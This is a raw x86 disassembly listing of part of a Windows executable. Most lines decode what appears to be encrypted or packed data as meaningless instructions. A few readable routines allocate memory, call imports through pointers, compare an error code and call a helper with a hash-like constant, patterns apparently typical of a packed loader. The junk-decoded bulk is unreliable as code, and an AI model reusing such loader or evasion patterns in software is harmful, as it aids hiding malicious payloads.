  422cae:	jb     0x422cc5
  422cb0:	and    ch,bl
  422cb2:	fadd   DWORD PTR [ebx+0x111e490f]
  422cb8:	pop    ebp
  422cb9:	ret    
  422cba:	or     eax,0x1794c318
  422cbf:	clc    
  422cc0:	jl     0x422ccf
  422cc2:	sar    DWORD PTR [eax+0x16411244],1
  422cc8:	aas    
  422cc9:	stos   DWORD PTR es:[edi],eax
  422cca:	loopne 0x422c87
  422ccc:	(bad)  [ebp+0x26]
  422ccf:	fist   WORD PTR [edx+0x1]
  422cd2:	dec    esp
  422cd3:	div    DWORD PTR [ebp-0x2c696889]
  422cd9:	retf   
  422cda:	daa    
  422cdb:	add    eax,DWORD PTR [ebp+0x198075a9]
  422ce1:	push   ecx
  422ce2:	xchg   esp,eax
  422ce3:	out    0x82,eax
  422ce5:	test   DWORD PTR [ecx+0x5f40c46],esi
  422ceb:	inc    ecx
  422cec:	stc    
  422ced:	(bad)  
  422cee:	cmp    ebx,DWORD PTR [ecx-0x51f46372]
  422cf4:	std    
  422cf5:	and    al,0x7c
  422cf7:	shl    BYTE PTR [eax+0x2b3839d9],cl
  422cfd:	in     eax,dx
  422cfe:	xor    DWORD PTR [ecx],0xeaf6ba5d
  422d04:	repnz pop ss
  422d06:	inc    edx
  422d07:	call   0xa9d6:0x773fdcfc
  422d0e:	mov    ebx,0x54a8ba6d
  422d13:	adc    eax,0xd47484d2
  422d18:	sbb    eax,0x6bfe5df7
  422d1d:	aas    
  422d1e:	popa   
  422d1f:	push   ebp
  422d20:	xchg   ebp,eax
  422d21:	ins    BYTE PTR es:[edi],dx
  422d22:	pop    edi
  422d23:	jge    0x422ce3
  422d25:	jb     0x422cad
  422d27:	xor    eax,0xcc24333f
  422d2c:	jle    0x422cc1
  422d2e:	xchg   edi,eax
  422d2f:	into   
  422d30:	mov    ebx,DWORD PTR [ebp+edx*1+0x46]
  422d34:	add    ah,0xf0
  422d37:	(bad)  
  422d38:	repnz popa 
  422d3a:	leave  
  422d3b:	xchg   esp,eax
  422d3c:	repz sub BYTE PTR [esi+0x2b0228f],bl
  422d43:	dec    esi
  422d44:	jb     0x422cc9
  422d46:	mov    eax,0xd5e47ff7
  422d4b:	(bad)  
  422d4c:	int    0x8c
  422d4e:	mov    esi,0x7319213d
  422d53:	and    al,0xc
  422d55:	les    esp,FWORD PTR [esi+edx*8+0x6964bbd5]
  422d5c:	xchg   BYTE PTR [ebx],ah
  422d5e:	pop    es
  422d5f:	xchg   DWORD PTR [ecx+0x7dbc9c65],edi
  422d65:	pop    eax
  422d66:	ds sbb al,bl
  422d69:	daa    
  422d6a:	loopne 0x422d51
  422d6c:	pop    ebx
  422d6d:	add    bh,BYTE PTR [edx+0x422e20aa]
  422d73:	js     0x422db9
  422d75:	stos   DWORD PTR es:[edi],eax
  422d76:	mov    esp,0x1bf4bcb2
  422d7b:	clc    
  422d7c:	dec    ebp
  422d7d:	sbb    ch,BYTE PTR [esp+ebp*1]
  422d80:	fwait
  422d81:	lea    ebp,[edi]
  422d83:	sbb    DWORD PTR [edx-0x48],0xffffffb2
  422d87:	adc    al,0xde
  422d89:	add    al,0xc2
  422d8b:	lock out dx,eax
  422d8d:	pusha  
  422d8e:	mov    ds:0xf88781e6,eax
  422d93:	dec    edx
  422d94:	js     0x422e0e
  422d96:	cld    
  422d97:	jmp    0x422dcc
  422d99:	sbb    al,0x45
  422d9b:	inc    ecx
  422d9c:	adc    cl,BYTE PTR [esi-0x1c97e850]
  422da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422da3:	xchg   BYTE PTR [ecx-0x8d021a4],ah
  422da9:	aad    0x8
  422dab:	jnp    0x422dc4
  422dad:	or     al,BYTE PTR [esi-0x409b7db]
  422db3:	mov    dh,0x91
  422db5:	xchg   ebx,eax
  422db6:	sbb    eax,0x4320a39d
  422dbb:	pop    es
  422dbc:	in     al,0x3b
  422dbe:	hlt    
  422dbf:	ret    0x48da
  422dc2:	sbb    DWORD PTR [edi],ecx
  422dc4:	cdq    
  422dc5:	jo     0x422dcf
  422dc7:	cmp    BYTE PTR [edx-0xf],dl
  422dca:	mov    ds:0x7796890d,eax
  422dcf:	popf   
  422dd0:	jg     0x422d98
  422dd2:	int3   
  422dd3:	pop    es
  422dd4:	or     ax,0x499f
  422dd8:	ins    BYTE PTR es:[edi],dx
  422dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dda:	inc    DWORD PTR [eax-0xd8717d5]
  422de0:	inc    ecx
  422de1:	ret    0x946d
  422de4:	inc    BYTE PTR [eax]
  422de6:	and    dl,BYTE PTR [esi-0xde71f29]
  422dec:	outs   dx,DWORD PTR ds:[esi]
  422ded:	dec    ebp
  422dee:	sub    eax,ebp
  422df0:	fldcw  WORD PTR [ebx+0xcaae250]
  422df6:	push   ebx
  422df7:	add    al,0xd7
  422df9:	mov    ebp,0x677ddf74
  422dfe:	cs mov al,0x26
  422e01:	call   0xc389:0x9248df13
  422e08:	ror    DWORD PTR [ecx-0x25],cl
  422e0b:	jno    0x422dae
  422e0d:	int3   
  422e0e:	jle    0x422df1
  422e10:	add    ebx,edi
  422e12:	lock push es
  422e14:	in     al,dx
  422e15:	adc    eax,0x5352f311
  422e1a:	hlt    
  422e1b:	mov    al,ds:0xf646e98a
  422e20:	inc    esp
  422e21:	std    
  422e22:	jo     0x422e78
  422e24:	fadd   DWORD PTR [edx]
  422e26:	jl     0x422da8
  422e28:	adc    al,0xc3
  422e2a:	sbb    esi,DWORD PTR [ecx]
  422e2c:	daa    
  422e2d:	int3   
  422e2e:	(bad)  
  422e2f:	pop    ecx
  422e30:	clc    
  422e31:	ret    0x3e18
  422e34:	pop    es
  422e35:	mov    ebx,0x42a4f903
  422e3a:	inc    ebp
  422e3b:	pop    es
  422e3c:	pop    edx
  422e3d:	mov    BYTE PTR [eax-0x340897e8],dh
  422e43:	cmp    edi,DWORD PTR [eax+ebp*8+0xa522b01]
  422e4a:	lods   al,BYTE PTR ds:[esi]
  422e4b:	test   DWORD PTR [ebx-0x7eee5199],0x82b9cd47
  422e55:	std    
  422e56:	mov    BYTE PTR [eax-0x41],dl
  422e59:	mov    ds:0xc3772e7b,al
  422e5e:	mov    bh,0xc7
  422e60:	or     edx,esi
  422e62:	jbe    0x422e46
  422e64:	dec    eax
  422e65:	ja     0x422e9a
  422e67:	inc    ebx
  422e68:	fld    DWORD PTR [edx-0x3fa420fc]
  422e6e:	fcmovu st,st(5)
  422e70:	mov    ecx,DWORD PTR [eax+0x69]
  422e73:	daa    
  422e74:	push   ds
  422e75:	jp     0x422e18
  422e77:	cld    
  422e78:	test   eax,0xd76e3d14
  422e7d:	jmp    FWORD PTR [eax]
  422e7f:	je     0x422eef
  422e81:	inc    ebx
  422e82:	and    bl,BYTE PTR [ebp-0x86e3930]
  422e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e89:	cmp    bl,BYTE PTR [edx]
  422e8b:	clc    
  422e8c:	stos   BYTE PTR es:[edi],al
  422e8d:	je     0x422e2a
  422e8f:	sub    BYTE PTR [ebx+edi*8-0x1d],dl
  422e93:	test   DWORD PTR [edi+eax*1-0x4bd9dbb1],edx
  422e9a:	xchg   BYTE PTR [eax+0x4f],bh
  422e9d:	xchg   DWORD PTR [esi-0x6e],ecx
  422ea0:	ss mov ebx,0x88600611
  422ea6:	pop    eax
  422ea7:	imul   eax,DWORD PTR [eax+0x410ae1ab],0x5e9d6a94
  422eb1:	cmp    DWORD PTR [edx],ebp
  422eb3:	nop
  422eb4:	aam    0x8d
  422eb6:	xor    esi,DWORD PTR [eax+0x39]
  422eb9:	pushf  
  422eba:	lock jnp 0x422ea5
  422ebd:	lods   al,BYTE PTR ds:[esi]
  422ebe:	mov    bh,0x9a
  422ec0:	sahf   
  422ec1:	inc    ecx
  422ec2:	xchg   BYTE PTR [ebx],dl
  422ec4:	outs   dx,BYTE PTR ds:[esi]
  422ec5:	push   eax
  422ec6:	pop    ecx
  422ec7:	xor    BYTE PTR [edi],dh
  422ec9:	mov    dh,0xe9
  422ecb:	xchg   esi,ebx
  422ecd:	adc    eax,DWORD PTR [esi+eiz*1-0x145ee9ca]
  422ed4:	jae    0xd1006e4c
  422eda:	push   0x37
  422edc:	cwde   
  422edd:	inc    ecx
  422ede:	add    al,0x89
  422ee0:	cld    
  422ee1:	push   cs
  422ee2:	mov    ebx,0x391db0b9
  422ee7:	js     0x422ec1
  422ee9:	mov    ch,0xde
  422eeb:	rol    DWORD PTR [ecx+0x6958685f],1
  422ef1:	aaa    
  422ef2:	mov    ?,WORD PTR [edi+0x6fb9582e]
  422ef8:	jne    0x422e91
  422efa:	enter  0x68d5,0xbc
  422efe:	popf   
  422eff:	jae    0x422ede
  422f01:	in     al,dx
  422f02:	in     eax,dx
  422f03:	xor    bl,BYTE PTR [ebx-0x5234948d]
  422f09:	pushf  
  422f0a:	in     al,dx
  422f0b:	fs mov bl,0x91
  422f0e:	mov    WORD PTR [ecx],ss
  422f10:	or     BYTE PTR [edx+0x68dc2a7c],cl
  422f16:	dec    ecx
  422f17:	xchg   edx,eax
  422f18:	dec    esi
  422f19:	lahf   
  422f1a:	push   esp
  422f1b:	xchg   edi,eax
  422f1c:	inc    ebx
  422f1d:	inc    ebp
  422f1e:	mov    eax,0x12d0355c
  422f23:	sub    BYTE PTR [edx+0x38],dl
  422f26:	jg     0x422f60
  422f28:	mov    DWORD PTR [eax-0x1c],edi
  422f2b:	push   edi
  422f2c:	imul   edx,DWORD PTR [edi-0x161462a3],0x1a370d43
  422f36:	mov    bl,BYTE PTR [edx-0x1f]
  422f39:	xchg   esi,eax
  422f3a:	cmp    DWORD PTR [edx],esi
  422f3c:	pop    esp
  422f3d:	cwde   
  422f3e:	mov    esp,0xa16f45b7
  422f43:	cmp    DWORD PTR [ebp+0x28],ecx
  422f46:	adc    eax,0xffe6f575
  422f4b:	in     al,dx
  422f4c:	(bad)  [ebx-0x6c6183f]
  422f52:	sub    eax,ebx
  422f54:	xchg   DWORD PTR [ebp+0x5ee42712],ebx
  422f5a:	dec    esi
  422f5b:	push   ss
  422f5c:	push   ebx
  422f5d:	mov    al,0x86
  422f5f:	and    ebx,DWORD PTR [eax+0x52101945]
  422f65:	and    eax,0xa966c4a
  422f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6b:	mov    BYTE PTR [edx-0x5d3ea960],cl
  422f71:	outs   dx,BYTE PTR ds:[esi]
  422f72:	inc    ecx
  422f73:	lahf   
  422f74:	mov    edx,0xcabf8013
  422f79:	lea    edi,[eax+0x1]
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0x73dedb0f
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	dec    DWORD PTR [ebx]
  42309a:	sub    BYTE PTR [esp+ecx*8+0x73],0x11
  42309f:	fild   QWORD PTR [edx-0x22ed305e]
  4230a5:	call   0x753f0963
  4230aa:	jo     0x4230bd
  4230ac:	fild   QWORD PTR [edx-0x62ed305a]
  4230b2:	pop    ss
  4230b3:	inc    esi
  4230b4:	fdivr  st,st(4)
  4230b6:	int3   
  4230b7:	jo     0x4230ca
  4230b9:	fild   QWORD PTR [edx-0x22ed305a]
  4230bf:	pop    ss
  4230c0:	inc    esi
  4230c1:	fdivr  st,st(4)
  4230c3:	int3   
  4230c4:	jo     0x4230d7
  4230c6:	fild   QWORD PTR [edx-0x22ed305a]
  4230cc:	pop    ss
  4230cd:	inc    esi
  4230ce:	fdivr  st,st(4)
  4230d0:	int3   
  4230d1:	jo     0x4230e4
  4230d3:	fild   QWORD PTR [edx-0x22ed30a2]
  4230d9:	sbb    DWORD PTR [ecx+0x62],ebx
  4230dc:	repnz int3 
  4230de:	les    ebx,FWORD PTR [eax]
  4230e0:	adc    cl,BYTE PTR [ebx+0x105ece1e]
  4230e6:	adc    dh,BYTE PTR ss:[eax+0x6150bf95]
  4230ed:	lods   eax,DWORD PTR ds:[esi]
  4230ee:	(bad)
  4230f1:	jae    0x4230a3
  4230f3:	aaa    
  4230f4:	and    eax,0x1fa292b9
  4230f9:	gs dec eax
  4230fc:	ret    
  4230fd:	out    dx,eax
  4230fe:	pusha  
  4230ff:	test   al,0x79
  423101:	data16 mov cl,0x92
  423104:	in     al,dx
  423105:	xor    al,0x5e
  423107:	mov    WORD PTR [edx-0x47895f35],cs
  42310d:	cmp    DWORD PTR [ebx-0x2b],ecx
  423110:	imul   al
  423112:	jo     0x423125
  423114:	fild   QWORD PTR [edx-0x25ed305a]
  42311a:	mov    ?,WORD PTR [edx-0x1dcb407f]
  423120:	sbb    ebx,DWORD PTR [edx+edx*2+0x2551c534]
  423127:	test   DWORD PTR [eax+eax*4-0x67],ecx
  42312b:	sar    BYTE PTR [edx+0x4e],0x27
  42312f:	cmp    BYTE PTR [edi+edx*4-0x7be21a89],ch
  423136:	and    BYTE PTR [esi-0x3a],ch
  423139:	sub    BYTE PTR [esi+eiz*8-0x60],dh
  42313d:	into   
  42313e:	aaa    
  42313f:	adc    bh,0x3b
  423142:	enter  0xf6e1,0x8a
  423146:	mov    BYTE PTR [ebx-0x21d91f2b],al
  42314c:	sbb    BYTE PTR [edi-0x492d2b11],dl
  423152:	dec    esp
  423153:	jno    0x423170
  423155:	xchg   DWORD PTR [edx+0x34],edx
  423158:	lds    edx,FWORD PTR [ecx+0x25]
  42315b:	test   BYTE PTR [eax+esi*8+0x5],cl
  42315f:	pop    esi
  423160:	jp     0x423110
  423162:	pop    es
  423163:	sub    ch,BYTE PTR [edx+eax*4+0x1e1d4fea]
  42316a:	mov    ebp,0xe978c6c1
  42316f:	dec    ebp
  423170:	mov    al,ds:0xd71aaafe
  423175:	push   ebp
  423176:	mov    esi,0x1594f64a
  42317b:	push   ds
  42317c:	aad    0xe8
  42317e:	pop    esi
  42317f:	pop    ebp
  423180:	sbb    BYTE PTR [edi-0x404fda82],cl
  423186:	xor    al,0xe2
  423188:	sbb    ebx,edi
  42318a:	stos   BYTE PTR es:[edi],al
  42318b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318c:	iret   
  42318d:	adc    bl,ch
  42318f:	pop    ss
  423190:	inc    esi
  423191:	mov    BYTE PTR [ecx-0x21a28f34],bh
  423197:	test   al,0xa6
  423199:	and    esi,ecx
  42319b:	sbb    BYTE PTR [eax+0x46],0xd8
  42319f:	cld    
  4231a0:	int3   
  4231a1:	jo     0x4231b4
  4231a3:	fild   QWORD PTR [edx-0x23ee30ba]
  4231a9:	sbb    al,0x47
  4231ab:	sar    ah,cl
  4231ad:	int3   
  4231ae:	pushf  
  4231af:	adc    eax,0xc9a2aadf
  4231b4:	adc    bl,ch
  4231b6:	pop    ss
  4231b7:	inc    esi
  4231b8:	fdivr  st,st(5)
  4231ba:	jno    0x42322c
  4231bc:	adc    edi,ebx
  4231be:	mov    edx,0xdd12cfa6
  4231c3:	adc    al,BYTE PTR [esi-0x28]
  4231c6:	cld    
  4231c7:	lea    esi,[eax+0x11]
  4231ca:	iret   
  4231cb:	stos   BYTE PTR es:[edi],al
  4231cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231cd:	iret   
  4231ce:	adc    ch,bl
  4231d0:	pop    ss
  4231d1:	inc    ebx
  4231d2:	fdivr  st,st(5)
  4231d4:	int3   
  4231d5:	jo     0x4231e8
  4231d7:	fild   QWORD PTR [edx-0x22ec305d]
  4231dd:	pop    ss
  4231de:	inc    esi
  4231df:	fdivr  st,st(4)
  4231e1:	int3   
  4231e2:	lock sbb bl,bh
  4231e5:	stos   BYTE PTR es:[edi],al
  4231e6:	mov    ds:0x266012cf,al
  4231eb:	inc    ebx
  4231ec:	fdivr  st,st(6)
  4231ee:	int3   
  4231ef:	jo     0x423182
  4231f1:	fild   QWORD PTR [edx-0x32ed304a]
  4231f7:	pop    ss
  4231f8:	inc    esi
  4231f9:	fdivr  st,st(4)
  4231fb:	fdiv   QWORD PTR [eax+0x11]
  4231fe:	iret   
  4231ff:	stos   BYTE PTR es:[edi],al
  423200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423201:	iret   
  423202:	adc    bl,ch
  423204:	pop    ss
  423205:	push   esi
  423206:	fdivr  st,st(4)
  423208:	int3   
  423209:	jo     0x42321c
  42320b:	fild   QWORD PTR [edx-0x22ed305a]
  423211:	xchg   ebx,eax
  423212:	sub    bl,dl
  423214:	cld    
  423215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423216:	jae    0x423229
  423218:	fild   QWORD PTR [edx+0x1212c496]
  42321e:	sub    al,BYTE PTR [esi-0x28]
  423221:	cld    
  423222:	int3   
  423223:	jo     0x423236
  423225:	fild   QWORD PTR [edx-0x22ed305a]
  42322b:	pop    ss
  42322c:	inc    esi
  42322d:	fdivr  st,st(4)
  42322f:	int3   
  423230:	jo     0x423243
  423232:	fild   QWORD PTR [edx-0x22ed305a]
  423238:	pop    ss
  423239:	inc    esi
  42323a:	fdivr  st,st(4)
  42323c:	int3   
  42323d:	jo     0x423250
  42323f:	fild   QWORD PTR [edx-0x22ed305a]
  423245:	pop    ss
  423246:	inc    esi
  423247:	fdivr  st,st(4)
  423249:	int3   
  42324a:	jo     0x42325d
  42324c:	fild   QWORD PTR [edx-0x22ed305a]
  423252:	pop    ss
  423253:	inc    esi
  423254:	fdivr  st,st(4)
  423256:	int3   
  423257:	jo     0x42326a
  423259:	fild   QWORD PTR [edx-0x22ed305a]
  42325f:	pop    ss
  423260:	inc    esi
  423261:	fdivr  st,st(4)
  423263:	int3   
  423264:	jo     0x423277
  423266:	fild   QWORD PTR [edx-0x22ed305a]
  42326c:	pop    ss
  42326d:	inc    esi
  42326e:	fdivr  st,st(4)
  423270:	int3   
  423271:	jo     0x423284
  423273:	fild   QWORD PTR [edx-0x22ed305a]
  423279:	pop    ss
  42327a:	inc    esi
  42327b:	fdivr  st,st(4)
  42327d:	int3   
  42327e:	jo     0x423291
  423280:	fild   QWORD PTR [edx-0x22ed305a]
  423286:	pop    ss
  423287:	inc    esi
  423288:	fcom   st(2)
  42328a:	mov    eax,0xaaab6915
  42328f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423290:	iret   
  423291:	adc    bh,ch
  423293:	sbb    al,0x46
  423295:	fsubr  st,st(4)
  423297:	int3   
  423298:	jo     0x4232ab
  42329a:	in     eax,0xae
  42329c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42329d:	iret   
  42329e:	push   ss
  42329f:	fst    QWORD PTR [edi]
  4232a1:	push   ss
  4232a2:	popf   
  4232a3:	mov    edi,0xdf5e24fe
  4232a8:	stos   BYTE PTR es:[edi],al
  4232a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232aa:	iret   
  4232ab:	adc    bl,ch
  4232ad:	aaa    
  4232ae:	inc    esi
  4232af:	fcomp  DWORD PTR [edx+eiz*8]
  4232b2:	add    ah,BYTE PTR [edx-0x53]
  4232b5:	leave  
  4232b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b7:	iret   
  4232b8:	adc    bl,ch
  4232ba:	inc    edi
  4232bb:	inc    esi
  4232bc:	fdivr  st,st(4)
  4232be:	cld    
  4232bf:	jnp    0x4232d2
  4232c1:	(bad)  
  4232c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232c4:	iret   
  4232c5:	adc    ah,bl
  4232c7:	adc    eax,DWORD PTR [esi-0x28]
  4232ca:	cld    
  4232cb:	int3   
  4232cc:	jo     0x4232df
  4232ce:	fild   QWORD PTR [edx-0x22ed305a]
  4232d4:	pop    ss
  4232d5:	data16 fdivr st,st(4)
  4232d8:	sub    al,0x70
  4232da:	adc    edi,ebx
  4232dc:	stos   BYTE PTR es:[edi],al
  4232dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232de:	iret   
  4232df:	adc    bl,ch
  4232e1:	pop    ss
  4232e2:	inc    esi
  4232e3:	fdivr  st,st(4)
  4232e5:	int3   
  4232e6:	jo     0x4232f9
  4232e8:	fild   QWORD PTR [edx-0x22ed305a]
  4232ee:	pop    ss
  4232ef:	inc    esi
  4232f0:	fdivr  st,st(4)
  4232f2:	int3   
  4232f3:	jo     0x423306
  4232f5:	fild   QWORD PTR [edx-0x22ed305a]
  4232fb:	pop    ss
  4232fc:	inc    esi
  4232fd:	fdivr  st,st(4)
  4232ff:	int3   
  423300:	jo     0x423313
  423302:	fild   QWORD PTR [edx-0x22ed305a]
  423308:	pop    ss
  423309:	inc    esi
  42330a:	fdivr  st,st(4)
  42330c:	int3   
  42330d:	jo     0x423320
  42330f:	fild   QWORD PTR [edx-0x22ed305a]
  423315:	pop    ss
  423316:	inc    esi
  423317:	fdivr  st,st(4)
  423319:	int3   
  42331a:	jo     0x42332d
  42331c:	fild   QWORD PTR [edx-0x22ed305a]
  423322:	pop    ss
  423323:	inc    esi
  423324:	fdivr  st,st(4)
  423326:	int3   
  423327:	jo     0x42333a
  423329:	fild   QWORD PTR [edx-0x22ed305a]
  42332f:	pop    ss
  423330:	inc    esi
  423331:	fdivr  st,st(4)
  423333:	int3   
  423334:	jo     0x423347
  423336:	fild   QWORD PTR [edx-0x22ed305a]
  42333c:	pop    ss
  42333d:	inc    esi
  42333e:	fdivr  st,st(4)
  423340:	int3   
  423341:	jo     0x423354
  423343:	fild   QWORD PTR [edx-0x22ed305a]
  423349:	pop    ss
  42334a:	inc    esi
  42334b:	fdivr  st,st(4)
  42334d:	int3   
  42334e:	jo     0x423361
  423350:	fild   QWORD PTR [edx-0x22ed305a]
  423356:	pop    ss
  423357:	inc    esi
  423358:	fdivr  st,st(4)
  42335a:	int3   
  42335b:	jo     0x42336e
  42335d:	fild   QWORD PTR [edx-0x22ed305a]
  423363:	pop    ss
  423364:	inc    esi
  423365:	fdivr  st,st(4)
  423367:	int3   
  423368:	jo     0x42337b
  42336a:	fild   QWORD PTR [edx-0x22ed305a]
  423370:	pop    ss
  423371:	inc    esi
  423372:	fdivr  st,st(4)
  423374:	int3   
  423375:	jo     0x423388
  423377:	fild   QWORD PTR [edx-0x22ed305a]
  42337d:	pop    ss
  42337e:	inc    esi
  42337f:	fdivr  st,st(4)
  423381:	int3   
  423382:	jo     0x423395
  423384:	fild   QWORD PTR [edx-0x22ed305a]
  42338a:	pop    ss
  42338b:	inc    esi
  42338c:	fdivr  st,st(4)
  42338e:	int3   
  42338f:	jo     0x4233a2
  423391:	fild   QWORD PTR [edx-0x22ed305a]
  423397:	pop    ss
  423398:	inc    esi
  423399:	fdivr  st,st(4)
  42339b:	int3   
  42339c:	jo     0x4233af
  42339e:	fild   QWORD PTR [edx-0x22ed305a]
  4233a4:	pop    ss
  4233a5:	inc    esi
  4233a6:	fdivr  st,st(4)
  4233a8:	int3   
  4233a9:	jo     0x4233bc
  4233ab:	fild   QWORD PTR [edx-0x22ed305a]
  4233b1:	pop    ss
  4233b2:	inc    esi
  4233b3:	fdivr  st,st(4)
  4233b5:	int3   
  4233b6:	jo     0x4233c9
  4233b8:	fild   QWORD PTR [edx-0x22ed305a]
  4233be:	pop    ss
  4233bf:	inc    esi
  4233c0:	fdivr  st,st(4)
  4233c2:	int3   
  4233c3:	jo     0x4233d6
  4233c5:	fild   QWORD PTR [edx-0x22ed305a]
  4233cb:	pop    ss
  4233cc:	inc    esi
  4233cd:	fdivr  st,st(4)
  4233cf:	int3   
  4233d0:	jo     0x4233e3
  4233d2:	fild   QWORD PTR [edx-0x22ed305a]
  4233d8:	pop    ss
  4233d9:	inc    esi
  4233da:	fdivr  st,st(4)
  4233dc:	int3   
  4233dd:	jo     0x4233f0
  4233df:	fild   QWORD PTR [edx-0x22ed305a]
  4233e5:	pop    ss
  4233e6:	inc    esi
  4233e7:	fdivr  st,st(4)
  4233e9:	int3   
  4233ea:	jo     0x4233fd
  4233ec:	fild   QWORD PTR [edx-0x22ed305a]
  4233f2:	pop    ss
  4233f3:	inc    esi
  4233f4:	fdivr  st,st(4)
  4233f6:	int3   
  4233f7:	jo     0x42340a
  4233f9:	fild   QWORD PTR [edx-0x22ed305a]
  4233ff:	pop    ss
  423400:	inc    esi
  423401:	fdivr  st,st(4)
  423403:	int3   
  423404:	jo     0x423417
  423406:	fild   QWORD PTR [edx-0x22ed305a]
  42340c:	pop    ss
  42340d:	inc    esi
  42340e:	fdivr  st,st(4)
  423410:	int3   
  423411:	jo     0x423424
  423413:	fild   QWORD PTR [edx-0x22ed305a]
  423419:	pop    ss
  42341a:	inc    esi
  42341b:	fdivr  st,st(4)
  42341d:	int3   
  42341e:	jo     0x423431
  423420:	fild   QWORD PTR [edx-0x22ed305a]
  423426:	pop    ss
  423427:	inc    esi
  423428:	fdivr  st,st(4)
  42342a:	int3   
  42342b:	jo     0x42343e
  42342d:	fild   QWORD PTR [edx-0x22ed305a]
  423433:	pop    ss
  423434:	inc    esi
  423435:	fdivr  st,st(4)
  423437:	int3   
  423438:	jo     0x42344b
  42343a:	fild   QWORD PTR [edx-0x22ed305a]
  423440:	pop    ss
  423441:	inc    esi
  423442:	fdivr  st,st(4)
  423444:	int3   
  423445:	jo     0x423458
  423447:	fild   QWORD PTR [edx-0x22ed305a]
  42344d:	pop    ss
  42344e:	inc    esi
  42344f:	fdivr  st,st(4)
  423451:	int3   
  423452:	jo     0x423465
  423454:	fild   QWORD PTR [edx-0x22ed305a]
  42345a:	pop    ss
  42345b:	inc    esi
  42345c:	fdivr  st,st(4)
  42345e:	int3   
  42345f:	jo     0x423472
  423461:	fild   QWORD PTR [edx-0x22ed305a]
  423467:	pop    ss
  423468:	inc    esi
  423469:	fdivr  st,st(4)
  42346b:	int3   
  42346c:	jo     0x42347f
  42346e:	fild   QWORD PTR [edx-0x22ed305a]
  423474:	pop    ss
  423475:	inc    esi
  423476:	fdivr  st,st(4)
  423478:	int3   
  423479:	jo     0x42348c
  42347b:	fild   QWORD PTR [edx-0x22ed305a]
  423481:	pop    ss
  423482:	inc    esi
  423483:	fdivr  st,st(4)
  423485:	int3   
  423486:	jo     0x423499
  423488:	fild   QWORD PTR [edx-0x22ed305a]
  42348e:	pop    ss
  42348f:	inc    esi
  423490:	fdivr  st,st(4)
  423492:	int3   
  423493:	jo     0x4234a6
  423495:	fild   QWORD PTR [edx+0x3355cfa6]
  42349b:	sbb    eax,0xccfcf746
  4234a0:	pusha  
  4234a1:	adc    edi,ebx
  4234a3:	add    BYTE PTR [edx*1+0x6be8bb63],0x46
  4234ab:	jnp    0x423449
  4234ad:	popf   
  4234ae:	daa    
  4234af:	aaa    
  4234b0:	mov    ecx,0xac745a12
  4234b5:	xchg   ebx,eax
  4234b6:	sbb    al,0xcb
  4234b8:	dec    ebp
  4234b9:	jnp    0x423521
  4234bb:	jl     0x4234f8
  4234bd:	and    BYTE PTR [edi],ah
